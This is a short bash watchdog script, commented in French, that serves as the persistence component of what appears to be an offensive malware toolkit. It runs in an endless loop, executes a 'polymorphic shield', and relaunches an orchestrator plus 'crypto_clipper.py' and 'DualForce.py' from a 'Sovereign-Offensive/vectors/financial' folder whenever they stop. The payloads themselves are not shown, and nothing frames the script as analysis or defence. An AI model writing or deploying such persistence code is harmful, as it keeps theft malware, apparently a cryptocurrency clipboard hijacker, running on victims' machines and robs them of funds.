#!/bin/bash
# SOVEREIGN-CORE : Gardien de Persistance

while true; do
    python3 core/Security_Advanced/PolymorphicShield.py
    # Vérification du noyau Java (Orchestrator)
    if ! pgrep -f "MissionOrchestrator" > /dev/null; then
        echo "[⚠️] REDÉMARRAGE : MissionOrchestrator hors ligne. Restauration..."
        ./start_sovereign_ops.sh &
    fi
    
    # Vérification des vecteurs Python
    for script in "crypto_clipper.py" "DualForce.py"; do
        if ! pgrep -f "$script" > /dev/null; then
            echo "[⚠️] REDÉMARRAGE : $script tombé. Ré-injection..."
            python3 Sovereign-Offensive/vectors/financial/$script &
        fi
    done
    sleep 15
done
